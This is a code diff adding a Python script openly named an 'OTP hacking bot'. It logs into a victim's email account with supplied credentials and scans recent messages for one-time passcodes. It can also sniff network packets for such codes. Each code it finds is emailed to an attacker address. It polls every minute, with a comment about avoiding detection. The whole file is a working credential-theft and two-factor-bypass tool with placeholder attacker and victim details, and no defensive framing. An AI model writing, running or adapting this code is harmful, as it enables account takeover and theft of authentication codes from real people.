@@ -1,0 +1,132 @@
+import re
+import smtplib
+import time
+from email.mime.text import MIMEText
+from scapy.all import sniff, TCP, IP
+import imaplib
+import email
+from email.header import decode_header
+import logging
+
+# Set up logging for the bot's activities
+logging.basicConfig(filename='otp_hack.log', level=logging.INFO, 
+                    format='%(asctime)s - %(message)s')
+
+# Function to extract OTP from text (e.g., SMS or email body)
+def extract_otp(text):
+    # Common OTP formats: 4-6 digits or alphanumeric codes
+    otp_pattern = r'\b\d{4,6}\b|\b[A-Za-z0-9]{6,8}\b'
+    match = re.search(otp_pattern, text)
+    if match:
+        logging.info(f"Found OTP: {match.group()}")
+        return match.group()
+    return None
+
+# Sniff network packets for SMS or HTTP traffic containing OTPs
+def sniff_packets():
+    def packet_callback(packet):
+        if packet.haslayer(TCP) and packet.haslayer(IP):
+            payload = str(packet[TCP].payload)
+            otp = extract_otp(payload)
+            if otp:
+                logging.info(f"Intercepted OTP from network: {otp}")
+                send_otp_to_attacker(otp)
+    
+    logging.info("Starting packet sniffing...")
+    try:
+        # Sniff packets on the specified interface (replace 'eth0' with your interface)
+        sniff(iface='eth0', filter="tcp", prn=packet_callback, store=0, timeout=300)
+    except Exception as e:
+        logging.error(f"Packet sniffing error: {e}")
+
+# Function to scrape OTPs from a compromised email account
+def scrape_email_otp(email_address, password, imap_server="imap.gmail.com"):
+    try:
+        # Connect to the email server
+        mail = imaplib.IMAP4_SSL(imap_server)
+        mail.login(email_address, password)
+        mail.select("inbox")
+        
+        # Search for recent emails
+        _, message_numbers = mail.search(None, "ALL")
+        for num in message_numbers[0].split()[-10:]:  # Check last 10 emails
+            _, msg_data = mail.fetch(num, "(RFC822)")
+            email_body = msg_data[0][1]
+            msg = email.message_from_bytes(email_body)
+            
+            # Decode email subject and body
+            subject = decode_header(msg["subject"])[0][0]
+            if isinstance(subject, bytes):
+                subject = subject.decode()
+            
+            if msg.is_multipart():
+                for part in msg.walk():
+                    if part.get_content_type() == "text/plain":
+                        body = part.get_payload(decode=True).decode()
+                        otp = extract_otp(body)
+                        if otp:
+                            logging.info(f"Found OTP in email: {otp}")
+                            send_otp_to_attacker(otp)
+                            return otp
+            else:
+                body = msg.get_payload(decode=True).decode()
+                otp = extract_otp(body)
+                if otp:
+                    logging.info(f"Found OTP in email: {otp}")
+                    send_otp_to_attacker(otp)
+                    return otp
+        
+        mail.logout()
+    except Exception as e:
+        logging.error(f"Email scraping error: {e}")
+    return None
+
+# Send extracted OTP to attacker's email
+def send_otp_to_attacker(otp, attacker_email="your_evil_email@example.com", 
+                        smtp_server="smtp.gmail.com", smtp_port=587, 
+                        sender_email="compromised_email@example.com", 
+                        sender_password="your_password"):
+    try:
+        msg = MIMEText(f"Intercepted OTP: {otp}")
+        msg['Subject'] = 'Intercepted OTP'
+        msg['From'] = sender_email
+        msg['To'] = attacker_email
+        
+        server = smtplib.SMTP(smtp_server, smtp_port)
+        server.starttls()
+        server.login(sender_email, sender_password)
+        server.sendmail(sender_email, attacker_email, msg.as_string())
+        server.quit()
+        logging.info(f"Sent OTP {otp} to {attacker_email}")
+    except Exception as e:
+        logging.error(f"Error sending OTP to attacker: {e}")
+
+# Main function to run the OTP hacking bot
+def run_otp_hacking_bot():
+    logging.info("Starting OTP hacking bot...")
+    
+    # Configuration (replace with your own details)
+    target_email = "target_victim@example.com"
+    target_email_password = "victim_password"
+    attacker_email = "your_evil_email@example.com"
+    attacker_smtp_email = "your_smtp_email@example.com"
+    attacker_smtp_password = "your_smtp_password"
+    
+    # Run email scraping in a loop
+    while True:
+        logging.info("Checking for OTPs in email...")
+        scrape_email_otp(target_email, target_email_password)
+        
+        # Optionally, run packet sniffing in parallel (uncomment if needed)
+        # sniff_packets()
+        
+        # Wait before checking again to avoid detection
+        time.sleep(60)  # Check every 60 seconds
+    
+if __name__ == "__main__":
+    try:
+        run_otp_hacking_bot()
+    except KeyboardInterrupt:
+        logging.info("OTP hacking bot stopped by user.")
+    except Exception as e:
+        logging.error(f"Fatal error in bot: {e}")
